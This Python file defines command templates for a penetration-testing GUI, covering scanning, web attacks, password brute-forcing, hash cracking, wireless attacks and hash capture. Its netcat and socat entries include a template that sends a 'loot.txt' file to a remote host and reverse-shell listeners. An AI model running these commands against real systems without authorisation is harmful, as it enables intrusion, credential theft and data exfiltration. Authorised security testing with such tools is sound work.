"""
HakPak4 Tool Profiles – Automatic Command Generation
=====================================================
Maps tool names to labelled use-cases with shell command templates.

Template syntax: {PARAM_KEY}
  – Replaced by user-supplied values in the Script Builder GUI.
  – Unused params leave the literal {PARAM_KEY} in the command so the
    generated script stays syntactically valid as a template.

Each use-case entry:
  id          – machine identifier (snake_case)
  label       – display name in the GUI dropdown
  description – one-sentence explanation shown as a hint
  template    – full command string with {PARAM} placeholders
  params      – ordered list of param definitions:
                  key         – must match {KEY} in template
                  label       – editor field label
                  placeholder – example / default shown in input
                  required    – bool; GUI marks field with *
"""

TOOL_PROFILES: dict[str, dict] = {

    # ── Information Gathering ────────────────────────────────────────────────

    "nmap": {"use_cases": [
        {"id": "quick_scan",        "label": "Quick Port Scan",
         "description": "Fast scan of the top 1000 ports.",
         "template": "nmap -T4 --open {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP / Range", "placeholder": "192.168.1.0/24", "required": True}]},

        {"id": "service_version",   "label": "Service & Version Detection",
         "description": "Probe open ports for running services and version info.",
         "template": "nmap -sV -T4 {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP / Range", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "os_detection",      "label": "OS Detection",
         "description": "Attempt to identify the operating system.",
         "template": "sudo nmap -O -T4 {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "aggressive",        "label": "Aggressive Scan",
         "description": "OS + version + scripts + traceroute all at once.",
         "template": "nmap -A -T4 {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP / Range", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "full_tcp",          "label": "Full TCP All Ports",
         "description": "Scan all 65535 TCP ports.",
         "template": "nmap -sV -p- -T4 {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "udp_scan",          "label": "UDP Scan",
         "description": "Scan common UDP ports (requires root).",
         "template": "sudo nmap -sU -T3 {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "script_scan",       "label": "Default Scripts Scan",
         "description": "Run NSE default scripts with version detection.",
         "template": "nmap -sC -sV {TARGET}",
         "params": [{"key": "TARGET", "label": "Target IP", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "host_discovery",    "label": "Host Discovery (Ping Sweep)",
         "description": "Discover live hosts in a subnet without port scanning.",
         "template": "nmap -sn {SUBNET}",
         "params": [{"key": "SUBNET", "label": "Subnet", "placeholder": "192.168.1.0/24", "required": True}]},

        {"id": "port_specific",     "label": "Specific Port(s)",
         "description": "Scan only specified ports.",
         "template": "nmap -sV -p {PORTS} {TARGET}",
         "params": [
             {"key": "PORTS",  "label": "Ports",  "placeholder": "22,80,443,3389", "required": True},
             {"key": "TARGET", "label": "Target", "placeholder": "10.10.10.10",   "required": True},
         ]},
    ]},

    "masscan": {"use_cases": [
        {"id": "full_scan",     "label": "Full Port Scan",
         "description": "Scan all 65535 ports at high speed.",
         "template": "masscan -p1-65535 {TARGET} --rate={RATE}",
         "params": [
             {"key": "TARGET", "label": "Target IP / CIDR", "placeholder": "10.10.10.10", "required": True},
             {"key": "RATE",   "label": "Rate (pkts/sec)",  "placeholder": "10000",        "required": False},
         ]},

        {"id": "common_ports",  "label": "Common Ports",
         "description": "Scan the most frequently targeted ports.",
         "template": "masscan -p21,22,23,25,80,443,3306,3389,8080,8443 {TARGET} --rate=1000",
         "params": [{"key": "TARGET", "label": "Target IP / CIDR", "placeholder": "192.168.1.0/24", "required": True}]},
    ]},

    "rustscan": {"use_cases": [
        {"id": "quick",         "label": "Quick Scan",
         "description": "Ultra-fast open port discovery.",
         "template": "rustscan -a {TARGET}",
         "params": [{"key": "TARGET", "label": "Target", "placeholder": "10.10.10.10", "required": True}]},

        {"id": "with_nmap",     "label": "Scan + Pass to nmap",
         "description": "Find ports with RustScan then run nmap -sV on them.",
         "template": "rustscan -a {TARGET} -- -sV -sC",
         "params": [{"key": "TARGET", "label": "Target", "placeholder": "10.10.10.10", "required": True}]},
    ]},

    "amass": {"use_cases": [
        {"id": "passive",   "label": "Passive Enumeration",
         "description": "Discover subdomains without active probing.",
         "template": "amass enum -passive -d {DOMAIN}",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "active",    "label": "Active Enumeration",
         "description": "Active subdomain enumeration including DNS brute-force.",
         "template": "amass enum -active -d {DOMAIN}",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "brute",     "label": "Brute-Force Subdomains",
         "description": "Brute-force subdomains using a custom wordlist.",
         "template": "amass enum -brute -d {DOMAIN} -w {WORDLIST}",
         "params": [
             {"key": "DOMAIN",   "label": "Domain",   "placeholder": "example.com",          "required": True},
             {"key": "WORDLIST", "label": "Wordlist",  "placeholder": "/usr/share/amass/wordlists/subdomains.lst", "required": True},
         ]},
    ]},

    "theharvester": {"use_cases": [
        {"id": "all_sources",   "label": "All Sources",
         "description": "Harvest emails, hosts, and IPs from all available sources.",
         "template": "theHarvester -d {DOMAIN} -b all",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "google",        "label": "Google Search",
         "description": "Harvest intel via Google dorking.",
         "template": "theHarvester -d {DOMAIN} -b google",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "linkedin",      "label": "LinkedIn",
         "description": "Enumerate LinkedIn profiles associated with a domain.",
         "template": "theHarvester -d {DOMAIN} -b linkedin",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},
    ]},

    "dnsenum": {"use_cases": [
        {"id": "basic",         "label": "Basic DNS Enumeration",
         "description": "Standard DNS enumeration of a domain.",
         "template": "dnsenum {DOMAIN}",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "zone_transfer",  "label": "Zone Transfer Attempt",
         "description": "Attempt DNS zone transfer against the domain.",
         "template": "dnsenum --noreverse {DOMAIN}",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},
    ]},

    "dnsrecon": {"use_cases": [
        {"id": "standard",      "label": "Standard Scan",
         "description": "Run all standard DNS enumeration checks.",
         "template": "dnsrecon -d {DOMAIN}",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "zone_transfer",  "label": "Zone Transfer",
         "description": "Attempt AXFR zone transfer.",
         "template": "dnsrecon -d {DOMAIN} -t axfr",
         "params": [{"key": "DOMAIN", "label": "Domain", "placeholder": "example.com", "required": True}]},

        {"id": "brute_force",   "label": "Subdomain Brute Force",
         "description": "Brute-force subdomains using a wordlist.",
         "template": "dnsrecon -d {DOMAIN} -t brt -D {WORDLIST}",
         "params": [
             {"key": "DOMAIN",   "label": "Domain",   "placeholder": "example.com",                "required": True},
             {"key": "WORDLIST", "label": "Wordlist",  "placeholder": "/usr/share/dnsrecon/namelist.txt", "required": True},
         ]},
    ]},

    # ── Vulnerability Analysis ───────────────────────────────────────────────

    "nikto": {"use_cases": [
        {"id": "basic",         "label": "Basic Web Scan",
         "description": "Default nikto scan against a web host.",
         "template": "nikto -h {TARGET}",
         "params": [{"key": "TARGET", "label": "Target URL / IP", "placeholder": "http://10.10.10.10", "required": True}]},

        {"id": "ssl",           "label": "SSL / HTTPS Scan",
         "description": "Scan HTTPS endpoints.",
         "template": "nikto -h {TARGET} -ssl",
         "params": [{"key": "TARGET", "label": "Target URL / IP", "placeholder": "https://10.10.10.10", "required": True}]},

        {"id": "port",          "label": "Custom Port Scan",
         "description": "Scan a web server on a non-standard port.",
         "template": "nikto -h {TARGET} -p {PORT}",
         "params": [
             {"key": "TARGET", "label": "Target IP", "placeholder": "10.10.10.10", "required": True},
             {"key": "PORT",   "label": "Port",      "placeholder": "8080",        "required": True},
         ]},
    ]},

    # ── Web Application ──────────────────────────────────────────────────────

    "sqlmap": {"use_cases": [
        {"id": "detect",        "label": "Detect SQL Injection",
         "description": "Auto-detect injectable parameters in a URL.",
         "template": 'sqlmap -u "{URL}" --batch',
         "params": [{"key": "URL", "label": "Target URL", "placeholder": "http://10.10.10.10/page?id=1", "required": True}]},

        {"id": "dump_all",      "label": "Dump Entire Database",
         "description": "Dump all tables from the identified database.",
         "template": 'sqlmap -u "{URL}" --dump --batch',
         "params": [{"key": "URL", "label": "Target URL", "placeholder": "http://10.10.10.10/page?id=1", "required": True}]},

        {"id": "list_dbs",      "label": "List Databases",
         "description": "Enumerate all accessible databases.",
         "template": 'sqlmap -u "{URL}" --dbs --batch',
         "params": [{"key": "URL", "label": "Target URL", "placeholder": "http://10.10.10.10/page?id=1", "required": True}]},

        {"id": "post_data",     "label": "POST Request Injection",
         "description": "Test SQL injection in POST body parameters.",
         "template": 'sqlmap -u "{URL}" --data="{DATA}" --batch',
         "params": [
             {"key": "URL",  "label": "Target URL", "placeholder": "http://10.10.10.10/login",     "required": True},
             {"key": "DATA", "label": "POST Data",  "placeholder": "user=admin&pass=test",          "required": True},
         ]},

        {"id": "cookie",        "label": "Cookie Injection",
         "description": "Inject through cookie values.",
         "template": 'sqlmap -u "{URL}" --cookie="{COOKIE}" --batch',
         "params": [
             {"key": "URL",    "label": "Target URL", "placeholder": "http://10.10.10.10/profile", "required": True},
             {"key": "COOKIE", "label": "Cookie",     "placeholder": "session=abc123",             "required": True},
         ]},
    ]},

    "gobuster": {"use_cases": [
        {"id": "dir",           "label": "Directory Brute Force",
         "description": "Brute-force directories and files on a web server.",
         "template": "gobuster dir -u {URL} -w {WORDLIST}",
         "params": [
             {"key": "URL",      "label": "Target URL", "placeholder": "http://10.10.10.10", "required": True},
             {"key": "WORDLIST", "label": "Wordlist",   "placeholder": "/usr/share/wordlists/dirb/common.txt", "required": True},
         ]},

        {"id": "dns",           "label": "DNS Subdomain Enumeration",
         "description": "Enumerate subdomains via DNS brute-force.",
         "template": "gobuster dns -d {DOMAIN} -w {WORDLIST}",
         "params": [
             {"key": "DOMAIN",  "label": "Domain",   "placeholder": "example.com",           "required": True},
             {"key": "WORDLIST","label": "Wordlist",  "placeholder": "/usr/share/wordlists/subdomains-top1million-5000.txt", "required": True},
         ]},

        {"id": "ext",           "label": "File Extension Search",
         "description": "Brute-force files with specific extensions.",
         "template": "gobuster dir -u {URL} -w {WORDLIST} -x {EXTENSIONS}",
         "params": [
             {"key": "URL",        "label": "Target URL",  "placeholder": "http://10.10.10.10",  "required": True},
             {"key": "WORDLIST",   "label": "Wordlist",    "placeholder": "/usr/share/wordlists/dirb/common.txt", "required": True},
             {"key": "EXTENSIONS", "label": "Extensions",  "placeholder": "php,html,txt",        "required": True},
         ]},
    ]},

    "ffuf": {"use_cases": [
        {"id": "dir_fuzz",      "label": "Directory Fuzzing",
         "description": "Fuzz directories on a web server.",
         "template": "ffuf -u {URL}/FUZZ -w {WORDLIST}",
         "params": [
             {"key": "URL",      "label": "Base URL", "placeholder": "http://10.10.10.10", "required": True},
             {"key": "WORDLIST", "label": "Wordlist", "placeholder": "/usr/share/wordlists/dirb/common.txt", "required": True},
         ]},

        {"id": "subdomain",     "label": "Subdomain Fuzzing",
         "description": "Discover virtual hosts / subdomains.",
         "template": 'ffuf -u http://FUZZ.{DOMAIN} -H "Host: FUZZ.{DOMAIN}" -w {WORDLIST}',
         "params": [
             {"key": "DOMAIN",   "label": "Domain",   "placeholder": "example.com",           "required": True},
             {"key": "WORDLIST", "label": "Wordlist",  "placeholder": "/usr/share/wordlists/subdomains-top1million-5000.txt", "required": True},
         ]},

        {"id": "param_fuzz",    "label": "GET Parameter Fuzzing",
         "description": "Fuzz GET parameter values for hidden params.",
         "template": 'ffuf -u "{URL}?FUZZ=value" -w {WORDLIST}',
         "params": [
             {"key": "URL",      "label": "Base URL", "placeholder": "http://10.10.10.10/page",  "required": True},
             {"key": "WORDLIST", "label": "Wordlist", "placeholder": "/usr/share/wordlists/dirb/common.txt", "required": True},
         ]},
    ]},

    "feroxbuster": {"use_cases": [
        {"id": "dir_scan",      "label": "Directory Scan",
         "description": "Recursive directory and file discovery.",
         "template": "feroxbuster -u {URL} -w {WORDLIST}",
         "params": [
             {"key": "URL",      "label": "Target URL", "placeholder": "http://10.10.10.10", "required": True},
             {"key": "WORDLIST", "label": "Wordlist",   "placeholder": "/usr/share/wordlists/dirb/common.txt", "required": True},
         ]},

        {"id": "recursive",     "label": "Recursive with Depth Limit",
         "description": "Recursive scan limited to N directory levels.",
         "template": "feroxbuster -u {URL} -w {WORDLIST} --depth {DEPTH}",
         "params": [
             {"key": "URL",      "label": "Target URL", "placeholder": "http://10.10.10.10", "required": True},
             {"key": "WORDLIST", "label": "Wordlist",   "placeholder": "/usr/share/wordlists/dirb/common.txt", "required": True},
             {"key": "DEPTH",    "label": "Depth",      "placeholder": "3",                   "required": False},
         ]},
    ]},

    "dirb": {"use_cases": [
        {"id": "default",       "label": "Default Wordlist Scan",
         "description": "Scan using the built-in common.txt wordlist.",
         "template": "dirb {URL}",
         "params": [{"key": "URL", "label": "Target URL", "placeholder": "http://10.10.10.10", "required": True}]},

        {"id": "custom_wl",     "label": "Custom Wordlist",
         "description": "Scan with a user-supplied wordlist.",
         "template": "dirb {URL} {WORDLIST}",
         "params": [
             {"key": "URL",      "label": "Target URL", "placeholder": "http://10.10.10.10",  "required": True},
             {"key": "WORDLIST", "label": "Wordlist",   "placeholder": "/usr/share/wordlists/dirb/big.txt", "required": True},
         ]},
    ]},

    "wpscan": {"use_cases": [
        {"id": "basic",         "label": "Basic WordPress Scan",
         "description": "Enumerate WordPress version, themes, and plugins.",
         "template": "wpscan --url {URL}",
         "params": [{"key": "URL", "label": "WordPress URL", "placeholder": "http://10.10.10.10", "required": True}]},

        {"id": "enum_users",    "label": "Enumerate Users",
         "description": "Discover WordPress usernames.",
         "template": "wpscan --url {URL} -e u",
         "params": [{"key": "URL", "label": "WordPress URL", "placeholder": "http://10.10.10.10", "required": True}]},

        {"id": "enum_plugins",  "label": "Enumerate Plugins",
         "description": "List installed WordPress plugins and their versions.",
         "template": "wpscan --url {URL} -e p",
         "params": [{"key": "URL", "label": "WordPress URL", "placeholder": "http://10.10.10.10", "required": True}]},

        {"id": "password_attack", "label": "Password Attack",
         "description": "Brute-force WordPress login for a known user.",
         "template": "wpscan --url {URL} -U {USER} -P {WORDLIST}",
         "params": [
             {"key": "URL",      "label": "WordPress URL", "placeholder": "http://10.10.10.10",  "required": True},
             {"key": "USER",     "label": "Username",      "placeholder": "admin",                "required": True},
             {"key": "WORDLIST", "label": "Password List", "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
         ]},
    ]},

    # ── Password Attacks ─────────────────────────────────────────────────────

    "hydra": {"use_cases": [
        {"id": "ssh",           "label": "SSH Brute Force",
         "description": "Brute-force SSH credentials.",
         "template": "hydra -l {USER} -P {WORDLIST} {TARGET} ssh",
         "params": [
             {"key": "USER",     "label": "Username",      "placeholder": "admin",             "required": True},
             {"key": "WORDLIST", "label": "Password List", "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "TARGET",   "label": "Target IP",     "placeholder": "10.10.10.10",       "required": True},
         ]},

        {"id": "ftp",           "label": "FTP Brute Force",
         "description": "Brute-force FTP credentials.",
         "template": "hydra -l {USER} -P {WORDLIST} {TARGET} ftp",
         "params": [
             {"key": "USER",     "label": "Username",      "placeholder": "admin",             "required": True},
             {"key": "WORDLIST", "label": "Password List", "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "TARGET",   "label": "Target IP",     "placeholder": "10.10.10.10",       "required": True},
         ]},

        {"id": "rdp",           "label": "RDP Brute Force",
         "description": "Brute-force Remote Desktop credentials.",
         "template": "hydra -l {USER} -P {WORDLIST} rdp://{TARGET}",
         "params": [
             {"key": "USER",     "label": "Username",      "placeholder": "Administrator",     "required": True},
             {"key": "WORDLIST", "label": "Password List", "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "TARGET",   "label": "Target IP",     "placeholder": "10.10.10.10",       "required": True},
         ]},

        {"id": "http_basic",    "label": "HTTP Basic Auth",
         "description": "Brute-force HTTP Basic Authentication.",
         "template": "hydra -l {USER} -P {WORDLIST} {TARGET} http-get {PATH}",
         "params": [
             {"key": "USER",     "label": "Username",      "placeholder": "admin",             "required": True},
             {"key": "WORDLIST", "label": "Password List", "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "TARGET",   "label": "Target IP",     "placeholder": "10.10.10.10",       "required": True},
             {"key": "PATH",     "label": "Path",          "placeholder": "/admin",            "required": False},
         ]},

        {"id": "smb",           "label": "SMB Brute Force",
         "description": "Brute-force Windows SMB credentials.",
         "template": "hydra -l {USER} -P {WORDLIST} {TARGET} smb",
         "params": [
             {"key": "USER",     "label": "Username",  "placeholder": "administrator", "required": True},
             {"key": "WORDLIST", "label": "Password List", "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "TARGET",   "label": "Target IP",     "placeholder": "10.10.10.10",   "required": True},
         ]},
    ]},

    "hashcat": {"use_cases": [
        {"id": "md5",           "label": "MD5 Dictionary Attack",
         "description": "Crack MD5 hashes with a wordlist.",
         "template": "hashcat -m 0 {HASH_FILE} {WORDLIST}",
         "params": [
             {"key": "HASH_FILE", "label": "Hash File", "placeholder": "hashes.txt",   "required": True},
             {"key": "WORDLIST",  "label": "Wordlist",  "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
         ]},

        {"id": "sha1",          "label": "SHA-1 Dictionary Attack",
         "description": "Crack SHA-1 hashes with a wordlist.",
         "template": "hashcat -m 100 {HASH_FILE} {WORDLIST}",
         "params": [
             {"key": "HASH_FILE", "label": "Hash File", "placeholder": "hashes.txt",   "required": True},
             {"key": "WORDLIST",  "label": "Wordlist",  "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
         ]},

        {"id": "ntlm",          "label": "NTLM Dictionary Attack",
         "description": "Crack NTLM (Windows) hashes.",
         "template": "hashcat -m 1000 {HASH_FILE} {WORDLIST}",
         "params": [
             {"key": "HASH_FILE", "label": "Hash File", "placeholder": "hashes.txt",   "required": True},
             {"key": "WORDLIST",  "label": "Wordlist",  "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
         ]},

        {"id": "wpa2",          "label": "WPA2 Handshake Crack",
         "description": "Crack a captured WPA2 handshake file.",
         "template": "hashcat -m 2500 {CAP_FILE} {WORDLIST}",
         "params": [
             {"key": "CAP_FILE",  "label": "Capture File (.cap/.hccapx)", "placeholder": "handshake.hccapx", "required": True},
             {"key": "WORDLIST",  "label": "Wordlist", "placeholder": "/usr/share/wordlists/rockyou.txt",    "required": True},
         ]},

        {"id": "show",          "label": "Show Cracked Hashes",
         "description": "Display previously cracked hashes from potfile.",
         "template": "hashcat -m {MODE} {HASH_FILE} --show",
         "params": [
             {"key": "MODE",      "label": "Hash Mode (-m)", "placeholder": "1000",        "required": True},
             {"key": "HASH_FILE", "label": "Hash File",      "placeholder": "hashes.txt",  "required": True},
         ]},
    ]},

    "john": {"use_cases": [
        {"id": "auto_crack",    "label": "Auto Crack",
         "description": "Let John choose the best attack mode automatically.",
         "template": "john {HASH_FILE}",
         "params": [{"key": "HASH_FILE", "label": "Hash File", "placeholder": "hashes.txt", "required": True}]},

        {"id": "wordlist",      "label": "Wordlist Attack",
         "description": "Crack hashes using a wordlist.",
         "template": "john --wordlist={WORDLIST} {HASH_FILE}",
         "params": [
             {"key": "WORDLIST",  "label": "Wordlist",  "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "HASH_FILE", "label": "Hash File", "placeholder": "hashes.txt",   "required": True},
         ]},

        {"id": "show",          "label": "Show Results",
         "description": "Display all previously cracked passwords.",
         "template": "john --show {HASH_FILE}",
         "params": [{"key": "HASH_FILE", "label": "Hash File", "placeholder": "hashes.txt", "required": True}]},

        {"id": "shadow",        "label": "Linux Shadow File",
         "description": "Attack /etc/shadow (combine passwd + shadow first with unshadow).",
         "template": "john --wordlist={WORDLIST} {SHADOW_FILE}",
         "params": [
             {"key": "WORDLIST",    "label": "Wordlist",     "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "SHADOW_FILE", "label": "Shadow File",  "placeholder": "shadow.txt",    "required": True},
         ]},
    ]},

    # ── Wireless Attacks ─────────────────────────────────────────────────────

    "aircrack-ng": {"use_cases": [
        {"id": "wpa_crack",     "label": "Crack WPA/WPA2 Handshake",
         "description": "Dictionary attack on a captured WPA handshake.",
         "template": "aircrack-ng -w {WORDLIST} {CAP_FILE}",
         "params": [
             {"key": "WORDLIST", "label": "Wordlist",      "placeholder": "/usr/share/wordlists/rockyou.txt", "required": True},
             {"key": "CAP_FILE", "label": "Capture File",  "placeholder": "capture.cap",   "required": True},
         ]},

        {"id": "wep_crack",     "label": "Crack WEP",
         "description": "Crack WEP encryption from an IV capture.",
         "template": "aircrack-ng {CAP_FILE}",
         "params": [{"key": "CAP_FILE", "label": "Capture File", "placeholder": "capture.cap", "required": True}]},
    ]},

    "wifite": {"use_cases": [
        {"id": "auto",          "label": "Auto Attack All",
         "description": "Automatically target all visible wireless networks.",
         "template": "wifite",
         "params": []},

        {"id": "target_bssid",  "label": "Target Specific AP",
         "description": "Attack a specific access point by BSSID.",
         "template": "wifite --bssid {BSSID}",
         "params": [{"key": "BSSID", "label": "BSSID", "placeholder": "AA:BB:CC:DD:EE:FF", "required": True}]},
    ]},

    "reaver": {"use_cases": [
        {"id": "wps_attack",    "label": "WPS PIN Attack",
         "description": "Brute-force the WPS PIN to recover WPA passphrase.",
         "template": "reaver -i {INTERFACE} -b {BSSID} -vv",
         "params": [
             {"key": "INTERFACE", "label": "Monitor Interface", "placeholder": "wlan0mon",            "required": True},
             {"key": "BSSID",     "label": "Target BSSID",      "placeholder": "AA:BB:CC:DD:EE:FF",   "required": True},
         ]},
    ]},

    # ── Sniffing & Spoofing ──────────────────────────────────────────────────

    "tcpdump": {"use_cases": [
        {"id": "capture_all",   "label": "Capture All Traffic",
         "description": "Capture all packets on an interface to a file.",
         "template": "tcpdump -i {INTERFACE} -w {OUTPUT}",
         "params": [
             {"key": "INTERFACE", "label": "Interface", "placeholder": "eth0",        "required": True},
             {"key": "OUTPUT",    "label": "Output File","placeholder": "capture.pcap","required": True},
         ]},

        {"id": "filter_host",   "label": "Filter by Host",
         "description": "Capture only traffic to/from a specific host.",
         "template": "tcpdump -i {INTERFACE} host {HOST}",
         "params": [
             {"key": "INTERFACE", "label": "Interface", "placeholder": "eth0",        "required": True},
             {"key": "HOST",      "label": "Host",       "placeholder": "10.10.10.10", "required": True},
         ]},

        {"id": "filter_port",   "label": "Filter by Port",
         "description": "Capture only traffic on a specific port.",
         "template": "tcpdump -i {INTERFACE} port {PORT}",
         "params": [
             {"key": "INTERFACE", "label": "Interface", "placeholder": "eth0", "required": True},
             {"key": "PORT",      "label": "Port",       "placeholder": "80",   "required": True},
         ]},

        {"id": "read_pcap",     "label": "Read PCAP File",
         "description": "Read and display packets from a saved capture.",
         "template": "tcpdump -r {PCAP_FILE}",
         "params": [{"key": "PCAP_FILE", "label": "PCAP File", "placeholder": "capture.pcap", "required": True}]},
    ]},

    "mitmproxy": {"use_cases": [
        {"id": "basic_proxy",   "label": "Start HTTP/S Proxy",
         "description": "Launch mitmproxy on a local port.",
         "template": "mitmproxy -p {PORT}",
         "params": [{"key": "PORT", "label": "Listen Port", "placeholder": "8080", "required": True}]},

        {"id": "transparent",   "label": "Transparent Mode",
         "description": "Run as a transparent proxy (requires routing rules).",
         "template": "mitmproxy --mode transparent -p {PORT}",
         "params": [{"key": "PORT", "label": "Listen Port", "placeholder": "8080", "required": True}]},
    ]},

    "responder": {"use_cases": [
        {"id": "capture",       "label": "Capture Hashes",
         "description": "Listen on an interface and capture NTLM/NTLMv2 hashes.",
         "template": "sudo responder -I {INTERFACE} -rdwv",
         "params": [{"key": "INTERFACE", "label": "Interface", "placeholder": "eth0", "required": True}]},

        {"id": "analyze",       "label": "Analyze Mode (No Poisoning)",
         "description": "Listen without actively poisoning – discovery only.",
         "template": "sudo responder -I {INTERFACE} -A",
         "params": [{"key": "INTERFACE", "label": "Interface", "placeholder": "eth0", "required": True}]},
    ]},

    # ── Exploitation ─────────────────────────────────────────────────────────

    "msfconsole": {"use_cases": [
        {"id": "launch",        "label": "Launch Metasploit",
         "description": "Start the Metasploit Framework console.",
         "template": "msfconsole",
         "params": []},

        {"id": "run_script",    "label": "Run Resource Script",
         "description": "Execute a Metasploit resource (.rc) script.",
         "template": "msfconsole -r {SCRIPT}",
         "params": [{"key": "SCRIPT", "label": "Resource Script (.rc)", "placeholder": "exploit.rc", "required": True}]},

        {"id": "quiet",         "label": "Quiet Mode",
         "description": "Launch without the banner.",
         "template": "msfconsole -q",
         "params": []},
    ]},

    # ── Forensics ────────────────────────────────────────────────────────────

    "binwalk": {"use_cases": [
        {"id": "analyze",       "label": "Analyze Firmware",
         "description": "Scan a binary/firmware file for embedded signatures.",
         "template": "binwalk {FILE}",
         "params": [{"key": "FILE", "label": "File", "placeholder": "firmware.bin", "required": True}]},

        {"id": "extract",       "label": "Extract Embedded Files",
         "description": "Auto-extract embedded files and filesystems.",
         "template": "binwalk -e {FILE}",
         "params": [{"key": "FILE", "label": "File", "placeholder": "firmware.bin", "required": True}]},

        {"id": "recursive",     "label": "Recursive Extract",
         "description": "Recursively extract all nested embedded files.",
         "template": "binwalk -Me {FILE}",
         "params": [{"key": "FILE", "label": "File", "placeholder": "firmware.bin", "required": True}]},
    ]},

    # ── Utilities ────────────────────────────────────────────────────────────

    "netcat": {"use_cases": [
        {"id": "connect",       "label": "Connect to Host",
         "description": "Open a TCP connection to a host and port.",
         "template": "nc {HOST} {PORT}",
         "params": [
             {"key": "HOST", "label": "Host", "placeholder": "10.10.10.10", "required": True},
             {"key": "PORT", "label": "Port", "placeholder": "4444",        "required": True},
         ]},

        {"id": "listen",        "label": "Listen (Catch Reverse Shell)",
         "description": "Listen on a port for an incoming connection.",
         "template": "nc -lvnp {PORT}",
         "params": [{"key": "PORT", "label": "Listen Port", "placeholder": "4444", "required": True}]},

        {"id": "file_send",     "label": "Send File",
         "description": "Transfer a file to a remote listener.",
         "template": "nc -w 3 {HOST} {PORT} < {FILE}",
         "params": [
             {"key": "HOST", "label": "Receiver Host", "placeholder": "10.10.10.10", "required": True},
             {"key": "PORT", "label": "Port",           "placeholder": "9001",        "required": True},
             {"key": "FILE", "label": "File to Send",   "placeholder": "loot.txt",    "required": True},
         ]},

        {"id": "banner_grab",   "label": "Banner Grab",
         "description": "Grab the service banner from a port.",
         "template": 'echo "" | nc -w 3 {HOST} {PORT}',
         "params": [
             {"key": "HOST", "label": "Host", "placeholder": "10.10.10.10", "required": True},
             {"key": "PORT", "label": "Port", "placeholder": "80",          "required": True},
         ]},
    ]},

    "socat": {"use_cases": [
        {"id": "tcp_forward",   "label": "TCP Port Forward",
         "description": "Forward a local port to a remote host:port.",
         "template": "socat TCP-LISTEN:{LOCAL_PORT},reuseaddr,fork TCP:{REMOTE_HOST}:{REMOTE_PORT}",
         "params": [
             {"key": "LOCAL_PORT",   "label": "Local Port",   "placeholder": "8080",       "required": True},
             {"key": "REMOTE_HOST",  "label": "Remote Host",  "placeholder": "10.10.10.10","required": True},
             {"key": "REMOTE_PORT",  "label": "Remote Port",  "placeholder": "80",         "required": True},
         ]},

        {"id": "shell_listen",  "label": "Stable Shell Listener",
         "description": "Upgrade a reverse shell to a stable pty.",
         "template": "socat file:`tty`,raw,echo=0 tcp-listen:{PORT}",
         "params": [{"key": "PORT", "label": "Listen Port", "placeholder": "4444", "required": True}]},
    ]},
}
